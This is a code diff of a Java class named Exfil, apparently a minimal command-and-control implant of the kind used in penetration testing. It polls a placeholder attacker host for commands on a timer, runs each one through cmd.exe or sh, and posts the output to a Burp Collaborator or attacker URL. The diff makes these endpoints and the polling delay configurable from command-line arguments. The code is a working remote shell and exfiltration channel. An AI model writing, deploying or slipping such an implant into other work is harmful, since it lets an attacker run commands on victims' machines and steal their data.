@@ -6,14 +6,14 @@ import java.net.*;
 import java.util.*;
 	
 public class Exfil{
-	long delay = 10 * 1000; // delay in milliseconds
+	public long delay = 10 * 1000; // delay in milliseconds
 	LoopTask task = new LoopTask();
 	Timer timer = new Timer("TaskName");
 	String exe = System.getProperty("os.name").toLowerCase().contains("windows") ? "cmd.exe" : "sh";
 	String swtch = System.getProperty("os.name").toLowerCase().contains("windows") ? "/C" : "-c";
-	String url = "https://COLLABURL/Exfil";
-	String clearcheck = "https://YOURSERVER/clear-c2cmd.php?get=1";
-	String cmdcheck = "https://YOURSERVER/c2cmd.txt";
+	public String url = "https://YOURHOST_OR_BURPCOLLABORATOR/Exfil";
+	public String clearcheck = "https://YOURHOST/exploit/c2/2c.php?get=1";
+	public String cmdcheck = "https://YOURHOST/exploit/c2/c2.txt";
 	
 	private void clearCommand(){
 			try{
@@ -53,7 +53,7 @@ public class Exfil{
 				if (cmd == null || cmd.isEmpty()){
 					return "";
 				}
-				else{System.out.println("getcmd:"+cmd);
+				else{System.out.println("getcmd: " + cmd);
 					clearCommand();
 					return cmd;
 				}
@@ -75,6 +75,12 @@ public class Exfil{
 	
 	public static void main(String[] args){    
 			Exfil xf = new Exfil();
+			if (args.length==4){				 
+				xf.url = args[0];
+				xf.clearcheck = args[1];
+				xf.cmdcheck = args[2];
+				xf.delay = Long.parseLong(args[3]) * 1000;
+			}
 			xf.start();
 	} 
 	
@@ -82,7 +88,7 @@ public class Exfil{
 		public void run(){
 				String cmd = getCommand();
 				if (cmd == null || cmd.isEmpty()){
-					System.out.println("nothing");
+					//System.out.println("nothing");
 				}
 				else{							
 					try {
@@ -105,7 +111,7 @@ public class Exfil{
 							wr.flush();
 						}
 						int responseCode = httpClient.getResponseCode();
-						System.out.println("Response Code : " + responseCode);
+						System.out.println("Response Code: " + responseCode);
 						try (BufferedReader in = new BufferedReader(
 								new InputStreamReader(httpClient.getInputStream()))) {
 							String xline;
